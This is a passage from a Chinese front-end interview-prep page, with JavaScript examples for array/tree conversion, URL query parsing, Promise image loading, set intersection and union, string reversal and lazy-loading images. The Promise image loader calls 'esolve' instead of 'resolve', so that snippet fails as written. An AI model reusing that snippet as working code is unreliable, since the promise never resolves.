    <span class="token keyword">const</span> parentNode <span class="token operator">=</span> idToTreeNode<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>parentId<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>parentNode<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>parentNode<span class="token punctuation">.</span>children <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        parentNode<span class="token punctuation">.</span>children <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
      <span class="token punctuation">}</span>
      parentNode<span class="token punctuation">.</span>children<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>treeNode<span class="token punctuation">)</span> <span class="token comment">// 把treeNode加入到parentNode下</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 找到根节点</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>parentId <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      root <span class="token operator">=</span> treeNode
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>

  <span class="token keyword">return</span> root
<span class="token punctuation">}</span>

<span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span>
  <span class="token punctuation">{</span> <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'部门A'</span><span class="token punctuation">,</span> <span class="token literal-property property">parentId</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token comment">// 0 代表顶级节点，无父节点</span>
  <span class="token punctuation">{</span> <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'部门B'</span><span class="token punctuation">,</span> <span class="token literal-property property">parentId</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span> <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'部门C'</span><span class="token punctuation">,</span> <span class="token literal-property property">parentId</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span> <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'部门D'</span><span class="token punctuation">,</span> <span class="token literal-property property">parentId</span><span class="token operator">:</span> <span class="token number">2</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span> <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'部门E'</span><span class="token punctuation">,</span> <span class="token literal-property property">parentId</span><span class="token operator">:</span> <span class="token number">2</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span> <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'部门F'</span><span class="token punctuation">,</span> <span class="token literal-property property">parentId</span><span class="token operator">:</span> <span class="token number">3</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span>
<span class="token keyword">const</span> tree <span class="token operator">=</span> <span class="token function">arr2tree</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>tree<span class="token punctuation">)</span>
</code></pre></div><p><strong>连环问：把一个树转换为数组</strong></p> <ul><li><strong>思路</strong> <ul><li>遍历树节点（广度优先：一层层去遍历，结果是<code>ABCDEF</code>）而深度优先是（<code>ABDECF</code>）</li> <li>将树节点转为<code>Array Item</code>，<code>push</code>到数组中</li> <li>根据父子关系，找到<code>Array Item</code>的<code>parentId</code> <ul><li>如何找到<code>parentId</code> <ul><li>遍历树查找太慢</li> <li>可用一个<code>Map</code>来维护关系，便于查找</li></ul></li></ul></li></ul></li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">/**
 * @description tree to arr
 */</span>

<span class="token comment">// 数据结构</span>
<span class="token keyword">interface</span> <span class="token class-name">ITreeNode</span> <span class="token punctuation">{</span>
  <span class="token literal-property property">id</span><span class="token operator">:</span> number
  <span class="token literal-property property">name</span><span class="token operator">:</span> string
  children<span class="token operator">?</span><span class="token operator">:</span> ITreeNode<span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">tree2arr</span><span class="token punctuation">(</span><span class="token parameter">root</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// Map</span>
  <span class="token keyword">const</span> nodeToParent <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 映射当前节点和父节点关系</span>

  <span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

  <span class="token comment">// 广度优先遍历，queue</span>
  <span class="token keyword">const</span> queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
  queue<span class="token punctuation">.</span><span class="token function">unshift</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token comment">// 根节点 入队</span>

  <span class="token keyword">while</span> <span class="token punctuation">(</span>queue<span class="token punctuation">.</span>length <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> curNode <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 出队</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>curNode <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">break</span>

    <span class="token keyword">const</span> <span class="token punctuation">{</span> id<span class="token punctuation">,</span> name<span class="token punctuation">,</span> children <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">}</span> <span class="token operator">=</span> curNode

    <span class="token comment">// 创建数组 item 并 push</span>
    <span class="token keyword">const</span> parentNode <span class="token operator">=</span> nodeToParent<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>curNode<span class="token punctuation">)</span>
    <span class="token keyword">const</span> parentId <span class="token operator">=</span> parentNode<span class="token operator">?.</span>id <span class="token operator">||</span> <span class="token number">0</span>
    <span class="token keyword">const</span> item <span class="token operator">=</span> <span class="token punctuation">{</span> id<span class="token punctuation">,</span> name<span class="token punctuation">,</span> parentId <span class="token punctuation">}</span>
    arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span>

    <span class="token comment">// 子节点入队</span>
    children<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">child</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token comment">// 映射 parent</span>
      nodeToParent<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> curNode<span class="token punctuation">)</span>
      <span class="token comment">// 入队</span>
      queue<span class="token punctuation">.</span><span class="token function">unshift</span><span class="token punctuation">(</span>child<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">return</span> arr
<span class="token punctuation">}</span>

<span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
  <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'部门A'</span><span class="token punctuation">,</span>
  <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span>
      <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>
      <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'部门B'</span><span class="token punctuation">,</span>
      <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token punctuation">{</span> <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'部门D'</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token punctuation">{</span> <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'部门E'</span> <span class="token punctuation">}</span>
      <span class="token punctuation">]</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span>
      <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span>
      <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'部门C'</span><span class="token punctuation">,</span>
      <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token punctuation">{</span> <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'部门F'</span> <span class="token punctuation">}</span>
      <span class="token punctuation">]</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span>
<span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token function">tree2arr</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span>
</code></pre></div><h3 id="获取当前页面url参数"><a href="#获取当前页面url参数" class="header-anchor">#</a> 获取当前页面URL参数</h3> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 传统方式</span>
<span class="token keyword">function</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// search: '?a=10&amp;b=20&amp;c=30'</span>
  <span class="token keyword">const</span> search <span class="token operator">=</span> location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">// 去掉前面的？ 类似 array.slice(1)</span>
  <span class="token keyword">const</span> reg <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">(^|&amp;)</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">=([^&amp;]*)(&amp;|$)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">)</span>
  <span class="token keyword">const</span> res <span class="token operator">=</span> search<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>reg<span class="token punctuation">)</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>res <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">null</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> res<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
<span class="token punctuation">}</span>
<span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token comment">// 10</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 使用URLSearchParams方式</span>
<span class="token keyword">function</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> search <span class="token operator">=</span> location<span class="token punctuation">.</span>search
  <span class="token keyword">const</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>search<span class="token punctuation">)</span>
  <span class="token keyword">return</span> p<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// 20</span>
</code></pre></div><p><strong>将URL参数解析为JSON对象</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 传统方式，分析search</span>
<span class="token keyword">function</span> <span class="token function">queryToObj</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token comment">// search: '?a=10&amp;b=20&amp;c=30'</span>
  <span class="token keyword">const</span> search <span class="token operator">=</span> location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">// 去掉前面的？</span>
  search<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">paramStr</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
    <span class="token keyword">const</span> arr <span class="token operator">=</span> paramStr<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span>
    <span class="token keyword">const</span> key <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    <span class="token keyword">const</span> val <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    res<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> val
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> res
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 使用URLSearchParams方式</span>
<span class="token keyword">function</span> <span class="token function">queryToObj</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token keyword">const</span> pList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span>
  pList<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">val<span class="token punctuation">,</span>key</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
    res<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> val
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> res
<span class="token punctuation">}</span>
</code></pre></div><h3 id="手写promise加载一张图片"><a href="#手写promise加载一张图片" class="header-anchor">#</a> 手写Promise加载一张图片</h3> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">loadImg</span><span class="token punctuation">(</span><span class="token parameter">src</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span>
    <span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> img <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span>
      img<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
          <span class="token function">esolve</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span>
      <span class="token punctuation">}</span>
      img<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> err <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">图片加载失败 </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>src<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
        <span class="token function">reject</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
      <span class="token punctuation">}</span>
      img<span class="token punctuation">.</span>src <span class="token operator">=</span> src
    <span class="token punctuation">}</span>
  <span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 测试</span>

<span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token string">'https://s.poetries.work/uploads/2022/07/ee7310c4f45b9bd6.png'</span>
<span class="token function">loadImg</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">img</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>img<span class="token punctuation">.</span>width<span class="token punctuation">)</span>
  <span class="token keyword">return</span> img
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">img</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>img<span class="token punctuation">.</span>height<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">ex</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>ex<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">const</span> url1 <span class="token operator">=</span> <span class="token string">'https://s.poetries.work/uploads/2022/07/ee7310c4f45b9bd6.png'</span>
<span class="token keyword">const</span> url2 <span class="token operator">=</span> <span class="token string">'https://s.poetries.work/images/20210414100319.png'</span>

<span class="token function">loadImg</span><span class="token punctuation">(</span>url1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">img1</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>img1<span class="token punctuation">.</span>width<span class="token punctuation">)</span>
  <span class="token keyword">return</span> img1 <span class="token comment">// 普通对象</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">img1</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>img1<span class="token punctuation">.</span>height<span class="token punctuation">)</span>
  <span class="token keyword">return</span> <span class="token function">loadImg</span><span class="token punctuation">(</span>url2<span class="token punctuation">)</span> <span class="token comment">// promise 实例</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">img2</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>img2<span class="token punctuation">.</span>width<span class="token punctuation">)</span>
  <span class="token keyword">return</span> img2
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">img2</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>img2<span class="token punctuation">.</span>height<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">ex</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>ex<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre></div><h3 id="两个数组求交集和并集"><a href="#两个数组求交集和并集" class="header-anchor">#</a> 两个数组求交集和并集</h3> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 交集</span>
<span class="token keyword">function</span> <span class="token function">getIntersection</span><span class="token punctuation">(</span><span class="token parameter">arr1<span class="token punctuation">,</span> arr2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token keyword">const</span> set2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>arr2<span class="token punctuation">)</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> item <span class="token keyword">of</span> arr1<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>set2<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 考虑性能：这里使用set的has比数组的includes快很多</span>
      res<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span> 
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> Array<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token comment">// 转为数组返回</span>
<span class="token punctuation">}</span>

<span class="token comment">// 并集</span>
<span class="token keyword">function</span> <span class="token function">getUnion</span><span class="token punctuation">(</span><span class="token parameter">arr1<span class="token punctuation">,</span> arr2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>arr1<span class="token punctuation">)</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> item <span class="token keyword">of</span> arr2<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    res<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token comment">// 利用set的去重功能</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> Array<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token comment">// 转为数组返回</span>
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 测试</span>

<span class="token keyword">const</span> arr1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span>
<span class="token keyword">const</span> arr2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'交集'</span><span class="token punctuation">,</span> <span class="token function">getIntersection</span><span class="token punctuation">(</span>arr1<span class="token punctuation">,</span> arr2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 1,3,6</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'并集'</span><span class="token punctuation">,</span> <span class="token function">getUnion</span><span class="token punctuation">(</span>arr1<span class="token punctuation">,</span> arr2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 1,3,4,6,7,2,5</span>
</code></pre></div><h3 id="js反转字符串"><a href="#js反转字符串" class="header-anchor">#</a> JS反转字符串</h3> <blockquote><p>实现字符串<code>A1B2C3</code>反转为<code>3C2B1A</code></p></blockquote> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 方式1：str.split('').reverse().join('')</span>

<span class="token comment">// 方式2：使用栈来实现</span>
<span class="token keyword">function</span> <span class="token function">reverseStr</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> c <span class="token keyword">of</span> str<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token comment">// 入栈</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">let</span> newStr <span class="token operator">=</span> <span class="token string">''</span>
  <span class="token keyword">let</span> c <span class="token operator">=</span> <span class="token string">''</span>
  <span class="token keyword">while</span><span class="token punctuation">(</span>c <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 出栈 </span>
    newStr <span class="token operator">+=</span> c <span class="token comment">// 出栈再拼接</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> newStr
<span class="token punctuation">}</span>

<span class="token comment">// 测试</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">reverseStr</span><span class="token punctuation">(</span><span class="token string">'A1B2C3'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 3C2B1A</span>
</code></pre></div><h3 id="设计实现一个h5图片懒加载"><a href="#设计实现一个h5图片懒加载" class="header-anchor">#</a> 设计实现一个H5图片懒加载</h3> <ul><li><strong>分析</strong> <ul><li>定义 <code>&lt;img src=&quot;loading.png&quot; data-src=&quot;xx.png&quot; /&gt;</code></li> <li>页面滚动时，图片露出，将<code>data-src</code>赋值给<code>src</code></li> <li>滚动要节流</li></ul></li> <li><strong>获取图片定位</strong> <ul><li>元素的位置<code>ele.getBoundingClientRect</code> <img alt="" data-src="https://s.poetries.work/uploads/2023/02/bb6dc4fbd4180ec6.png" loading="lazy" class="lazy"></li> <li>图片<code>top &gt; window.innerHeight</code>没有露出，<code>top &lt; window.innerHeight</code>露出</li></ul></li></ul> <div class="language-html extra-class"><pre class="language-html"><code><span class="token comment">&lt;!-- 图片拦截加载 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>item-container<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>新闻标题<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./img/loading.gif<span class="token punctuation">&quot;</span></span> <span class="token attr-name">data-src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./img/animal1.jpeg<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>item-container<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>新闻标题<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
